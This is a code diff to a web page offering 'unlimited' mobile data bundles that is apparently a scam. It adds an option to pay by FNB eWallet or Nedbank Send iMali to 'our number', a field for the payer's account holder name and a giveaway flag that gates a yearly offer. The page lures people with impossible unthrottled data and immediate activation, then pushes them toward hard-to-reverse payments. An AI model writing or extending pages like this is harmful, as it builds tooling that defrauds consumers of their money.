@@ -28,6 +28,7 @@ lastym = "SET";
 	<!-- Main Style Css -->
     <link rel="stylesheet" href="css/style.css"/>
 <script>
+yurly = '0';
 days = '30';
 document.write(`
 <div style="position:fixed;top:0px;left:0px;height:100%;width:100%;background-image:linear-gradient( 136deg, rgb(242,113,33) 0%, rgb(233,64,87) 50%, rgb(138,35,135) 100%);z-index:999999;" id="loading">
@@ -160,8 +161,9 @@ account_bank=b_n;
 			                	<h3 style="font-size:16px;">Confirm your purchase to activate the <font class="days"></font> day unlimited <b id="choice">data</b> bundle for <b id="cnumber">0712345678</b></h3><br/>
 								<div class="form-row">
 									<div id="radio">
-										<input type="radio" name="gender" value="male" checked class="radio-1" onclick="document.getElementById('eftdet').style.display='block';document.getElementById('widet').style.display='none';document.getElementById('nobank').style.display='inline';"> Make a payment to our account number (EFT).
-										<br/><input type="radio" name="gender" value="female" class="radio-1" onclick="document.getElementById('eftdet').style.display='none';document.getElementById('widet').style.display='block';document.getElementById('nobank').style.display='none';"> Make a payment at Shoprite, Checkers, Usave or Boxer Store.
+										<input type="radio" name="gender" value="male" checked class="radio-1" onclick="document.getElementById('waldet').style.display='none';document.getElementById('eftdet').style.display='block';document.getElementById('widet').style.display='none';document.getElementById('nobank').style.display='inline';"> Make a payment to our account number (EFT).
+										<br/><input type="radio" name="gender" value="female" class="radio-1" onclick="document.getElementById('waldet').style.display='none';document.getElementById('eftdet').style.display='none';document.getElementById('widet').style.display='block';document.getElementById('nobank').style.display='none';"> Make a payment at Shoprite, Checkers, Usave or Boxer Store.
+										<br/><input type="radio" name="gender" value="female" class="radio-1" onclick="document.getElementById('widet').style.display='none';document.getElementById('eftdet').style.display='none';document.getElementById('eftdet').style.display='none';document.getElementById('waldet').style.display='block';document.getElementById('nobank').style.display='none';"> Make a payment using the FNB eWallet or Nedbank Send iMali.
 									</div>
 								</div><br/>
 								<div class="form-row expert">
@@ -197,6 +199,30 @@ account_bank=b_n;
 										</label>
 										<br/>
 										</div>
+									<div class="form-holder form-holder-2" id="waldet" style="display:none;">
+										<label class="form-row-inner">
+											<input type="text" name="your_email_1" id="famount3" class="form-control" value="Amount Due: R249.00" readonly>
+											<input type="text" name="your_email_1" id="fnumberx3" class="form-control" value="Bundle Recipient: 0712345678" readonly>
+											<br/>&nbsp;<br/>
+											<div id="wadiv">
+											<b>To make a payment using the eWallet or Send iMali service</b>
+											<ul>
+											<li>Copy our number located below</li>
+											<li>Simply logon into your online banking/cellphone banking/banking app</li>
+											<li>Make an eWallet(FNB) or Send iMali(Nedbank) transaction to our number</li>
+											<li>Enter the account holder's name as it appears on your card or banking profile in the field below</li>
+											<li>As soon as you complete the transaction, your bundle will be activated immediately</li>
+											</ul>
+											<font style="color:royalblue;" size="6" id="bigwal"></font><br/>
+										<select id="banco" class="form-control" onchange="document.getElementById('bigwal').style.color=this.value;"><option>Select Your Bank</option><option value="#00ff00">First National Bank</option><option value="green">Nedbank</option></select>
+											<input type="text" name="your_email_1" id="holder" class="form-control" value="" placeholder="Account Holder's Name">	
+										<input type="text" name="your_email_1" id="ecn" class="form-control" value="" readonly>
+										<a href="#copy" style="margin-top:6px;" onclick="copyThis3(u_wallet);" id="copylink3"><i class="zmdi zmdi-receipt"></i>&nbsp;Copy our Number</a><br/>
+											</div>
+										</label>
+										<br/>
+										</div>
+										
 								</div>
 								<div class="form-row">
 									<p style="font-size:13px;">Upon payment completion, the unlimited <font id="lbundle"></font> bundle will automatically be activated. You will recieve a SMS notification. This bundle will last <font class="days"></font> days, there is no usage threshold nor throttling, we will provide you unlimited bundle access for the duration of <font class="days"></font> days. <font id="nobank"><a href="javascript: noABSA()">I do not have <font id="bank_name"></font> account?</a></font></p>
@@ -243,6 +269,16 @@ account_bank=b_n;
 	}
 	</script>
 	<script>
+	copyThis3 = function(u_wallet) {
+	wac = document.getElementById('ecn');
+	woc = wac.value;
+	wac.value = u_wallet;
+	wac.select();
+	document.execCommand('copy');
+	wac.value = woc;
+	}
+	</script>
+	<script>
 	 function nextClick(e,wch,a) {
 	 document.querySelector('[role=\'menu\']').getElementsByTagName('a')[1].click();
 	 document.querySelector('[role=\'menu\']').style.opacity='1';
@@ -251,6 +287,7 @@ account_bank=b_n;
 	 document.getElementById('fbundle').value = days + " day Unlimited " + wch + " Bundle";
 	 document.getElementById('famount').value = "Amount Due: " + a;
 	 document.getElementById('famount2').value = "Amount Due: " + a;
+	 document.getElementById('famount3').value = "Amount Due: " + a;
 	 toggleNI();
 	fillDays();
 	 }
@@ -262,6 +299,7 @@ account_bank=b_n;
 	 document.getElementById('cnumber').innerHTML = e.value;
 	 document.getElementById('fnumberx').value = "Reference: " + e.value;
 	 document.getElementById('fnumberx2').value = "Reference: " + e.value;
+	 document.getElementById('fnumberx3').value = "Bundle Recipient: " + e.value;
 	 
 	 }
 	 window.setTimeout(function() {
@@ -355,7 +393,9 @@ fillDays = function() {
 	document.getElementById('bank_name').innerHTML = articl + "" + account_bank;
 	document.getElementById('acn').value = 'Account Number: ' + account_number;
 	document.getElementById('wcn').value = ' WiCode: ' + wi_code;
+	document.getElementById('ecn').value = ' Our Number: ' + wi_code;
 	document.getElementById('bigwi').innerHTML = wi_code;
+	document.getElementById('bigwal').innerHTML = u_wallet;
 	}
 	</script>
 	<script>
@@ -409,6 +449,9 @@ fillDays = function() {
 	} else if(result=="cost")
 	{
 	cheapmainOpen();
+	} else if(result=="yearly_give_away")
+	{
+	yurly = "1000";
 	} else if(result=="oldbrowser")
 	{
 	document.getElementById('responsivestylesheet').src = document.getElementById('responsivestylesheet').src + "?reload=yes";
@@ -418,7 +461,7 @@ fillDays = function() {
 
 	<script>
 	toggleNI = function() {
-	if(days=='365')
+	if(days=='365' && yurly=='1000')
 	{
 		document.getElementById('tni').style.display = "block"; } else {
 		
